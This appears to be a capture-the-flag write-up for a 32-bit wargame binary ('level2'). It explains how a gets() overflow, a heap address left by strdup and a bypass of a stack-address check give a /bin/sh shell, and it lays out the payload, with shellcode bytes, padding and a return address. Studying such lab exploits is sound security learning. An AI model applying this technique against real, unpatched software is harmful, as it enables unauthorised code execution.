=== Analysis ===

1. Ran "info functions" in GDB:
   - found function p() called from main
   - no helpful function like run() this time

2. Disassembled p() and found:
   - sub $0x68,%esp → allocates 104 bytes
   - lea -0x4c(%ebp),%eax → buffer at ebp-76
   - call gets() → vulnerable, no size limit
   - mov 0x4(%ebp),%eax → reads return address
   - and $0xb0000000,%eax → checks if starts with 0xb
   - jne → if NOT 0xb → continues to strdup
   - call strdup() → copies buffer to heap
   - ret → returns to our overwritten address

3. Checked protections:
   - NX disabled → shellcode can execute ✅
   - No ASLR → addresses are fixed ✅
   - No canary → overflow works cleanly ✅

=== The 0xb Protection ===

The binary checks if return address starts with 0xb:
   0xbffff... (stack) → BLOCKED ❌
   0x0804...  (heap)  → ALLOWED ✅

Cannot jump directly to shellcode on stack.

=== The Exploit Strategy ===

Key insight:
→ strdup copies buffer to heap (0x0804...)
      $ ltrace ./level2
      blabla
      strdup("blabla") = 0x0804a008 --> not dynamic
→ heap address stored in eax after strdup
→ found "call *%eax" at 0x080484cf in binary
→ 0x080484cf starts with 0x08 → passes 0xb check ✅
→ jumping to "call *%eax" → redirects to heap → shellcode!

Our actual payload
python[shellcode 21b] + [X * 59] + [0x0804a008]
Let me show exactly what each part does to memory:

==> Before overflow — normal stack
High addresses
┌─────────────────────┐
│  0xb7e454d3         │ ← return address (original, pointing to libc)
├─────────────────────┤
│  saved EBP          │ ← 4 bytes
├─────────────────────┤
│                     │
│  buffer 76 bytes    │ ← empty, waiting for input
│                     │
├─────────────────────┤
│  bottom padding     │ ← 28 bytes
└─────────────────────┘

== > After gets() reads our payload
High addresses
┌─────────────────────┐
│  0x0804a008         │ ← return address OVERWRITTEN with heap addr!
├─────────────────────┤
│  XXXXXXXX           │ ← EBP overwritten with X's
├─────────────────────┤
│  XXXXXXXXXXXXXXXXXX │ ← X's (padding)      ↑
│  XXXXXXXXXXXXXXXXXX │ ← X's (padding)      │ 59 X's
│  XXXXXXXXXXXXXXXXXX │ ← X's (padding)      ↓
│  \x6a\x0b\x58\x99..│ ← shellcode bytes    ← 21 bytes
├─────────────────────┤
│  bottom padding     │ ← 28 bytes untouched
└─────────────────────┘

Connecting payload bytes to memory positions
Payload:
[shellcode 21b] + [X * 59] + [0x0804a008]
     ↓                ↓           ↓
fills buffer     fills rest   overwrites
start            + EBP        return address
(byte 0-20)    (byte 21-79)   (byte 80-83)

Now the check runs
asmmov 0x4(%ebp),%eax   → reads return address → gets 0x0804a008
and $0xb0000000,%eax → 0x0804a008 & 0xb0000000 = 0x00000000
cmp $0xb0000000,%eax → 0x00000000 ≠ 0xb0000000
jne                  → NOT equal → PASSES ✅ → continues to strdup

strdup copies everything to heap
strdup takes buffer content:
[\x6a\x0b\x58\x99...shellcode...XXXXXXXXXX]
              ↓ copies byte by byte
heap at 0x0804a008:
[\x6a\x0b\x58\x99...shellcode...XXXXXXXXXX]
Now shellcode exists on heap at exactly 0x0804a008.

ret executes
ret reads return address from stack → 0x0804a008
CPU jumps to 0x0804a008
CPU finds shellcode bytes there
CPU executes them as instructions
→ /bin/sh opens 🎉

The beautiful circular logic
We put 0x0804a008 as return address
         ↓
0x0804a008 is WHERE strdup will copy our shellcode
         ↓
so after strdup runs → shellcode IS at 0x0804a008
         ↓
ret jumps to 0x0804a008 → shellcode is already there waiting!


============================ SHORT EXPLAINATION ===================================+

gets() → overflow → overwrite return address (0x0804a008)
        ↓
check passes (not stack)
        ↓
strdup → copies shellcode to heap at 0x0804a008
        ↓
ret → jumps to 0x0804a008 (because YOU set it)
        ↓
shellcode executes

PS: CPU executes whatever address I put in the return address, and it will only work if that address contains my shellcode

So the return address must point to a location that contains my shellcode bytes